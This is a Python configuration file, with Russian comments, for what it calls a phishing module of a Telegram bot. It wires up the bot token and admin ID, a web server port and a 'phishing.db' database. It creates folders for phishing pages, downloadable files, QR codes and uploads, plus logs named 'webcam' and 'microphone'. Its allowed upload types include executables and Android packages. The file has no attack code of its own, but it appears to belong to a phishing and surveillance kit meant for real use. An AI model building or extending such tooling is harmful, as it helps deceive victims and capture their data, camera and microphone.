"""
fish_config.py — конфигурация фишинг-модуля.
Берёт BOT_TOKEN и ADMIN_ID из общего .env (через automuvie config),
всё остальное — свои настройки.
"""
import os
import config as _amuvie_config  # automuvie config для TOKEN/ADMIN

# Берём из общего окружения
BOT_TOKEN  = getattr(_amuvie_config, 'TELEGRAM_BOT_TOKEN', os.getenv('BOT_TOKEN', ''))
ADMIN_ID   = int(os.getenv('ADMIN_ID', '0'))
SERVER_HOST = os.getenv('SERVER_HOST', '0.0.0.0')
SERVER_PORT = int(os.getenv('FISH_SERVER_PORT', os.getenv('SERVER_PORT', '5100')))
USE_SELENIUM = os.getenv('USE_SELENIUM', 'False').lower() == 'true'

BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
PAGES_DIR  = os.path.join(BASE_DIR, 'fish_pages')
DOWNLOADS_DIR = os.path.join(BASE_DIR, 'fish_downloads')
LOGS_DIR   = os.path.join(BASE_DIR, 'fish_logs')
QR_DIR     = os.path.join(BASE_DIR, 'fish_qr')
UPLOADS_DIR = os.path.join(BASE_DIR, 'fish_uploads')
DB_PATH    = os.path.join(BASE_DIR, 'data', 'phishing.db')
DOWNLOAD_TEMPLATE_PATH = os.path.join(BASE_DIR, 'templates', 'download_template.html')

ALLOWED_MIME_TYPES = {
    'image/jpeg', 'image/png', 'image/gif', 'image/webp',
    'application/pdf', 'application/msword',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'application/vnd.ms-excel',
    'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    'application/zip', 'application/x-rar-compressed', 'application/x-7z-compressed',
    'application/vnd.android.package-archive', 'application/x-msdownload',
    'application/x-msdos-program', 'text/plain', 'text/html', 'application/json',
}
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50 MB

for _d in [PAGES_DIR, DOWNLOADS_DIR, LOGS_DIR, QR_DIR, UPLOADS_DIR,
           os.path.dirname(DB_PATH), os.path.join(LOGS_DIR, 'webcam'),
           os.path.join(LOGS_DIR, 'microphone')]:
    os.makedirs(_d, exist_ok=True)
